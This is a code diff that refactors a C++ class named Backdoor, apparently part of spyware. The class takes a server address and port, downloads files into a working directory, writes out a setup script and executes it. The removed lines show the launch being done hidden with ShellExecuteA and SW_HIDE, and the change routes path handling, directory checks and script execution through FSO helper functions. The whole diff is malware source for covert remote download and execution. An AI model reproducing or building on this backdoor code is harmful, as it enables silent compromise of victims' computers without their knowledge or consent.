@@ -1,8 +1,7 @@
 #include "backdoor.h"
 #include "../proc.h"
 #include "opt.h"
-
-extern PATH_COMBINE path_combine;
+#include "../fso.h"
 
 bool Backdoor::check_update_avaiable(const Version * version) const
 {
@@ -43,7 +42,7 @@ bool Backdoor::dwnl_file(char * file_path) const
 	// check valid data then receive main file data
 	if (strlen(file_name) > 0 && file_size > 0)
 	{
-		path_combine(file_path, working_dir, file_name);
+		FSO::path_combine(file_path, working_dir, file_name);
 		FILE * fout = fopen(file_path, "w+b");
 		if (fout == NULL)
 			throw errno;
@@ -98,8 +97,7 @@ void Backdoor::install_pack(const char * file_path, bool using_tmpdir) const
 	}
 
 	export_setup_script();
-	HINSTANCE hinst = ShellExecuteA(NULL, "open", script_file_path, args, NULL, SW_HIDE);
-	if ((int)hinst > 32)
+	if (FSO::run(script_file_path, args))
 	{
 		LOG_I("Executed script!");
 	}
@@ -128,8 +126,7 @@ bool Backdoor::export_setup_script() const
 
 void Backdoor::create_working_dir_if_necessary() const
 {
-	DWORD attr = GetFileAttributesA(working_dir);
-	if (attr == INVALID_FILE_ATTRIBUTES || attr & FILE_ATTRIBUTE_DIRECTORY)
+	if (!FSO::dir_exists(working_dir))
 	{
 		LOG_D("Working directory is not exist! Creating...");
 		CreateDirectoryA(working_dir, NULL);
@@ -223,7 +220,7 @@ Backdoor::Backdoor(const char * server_addr, int server_port, const char * worki
 	this->working_dir = strdup(working_dir);
 	this->root_dir = strdup(root_dir);
 	this->script_file_path = new char[MAX_PATH];
-	path_combine(script_file_path, working_dir, SPY_BDR_SETUP_PACK_SCRIPT_NAME);
+	FSO::path_combine(script_file_path, working_dir, SPY_BDR_SETUP_PACK_SCRIPT_NAME);
 	create_working_dir_if_necessary();
 }
 
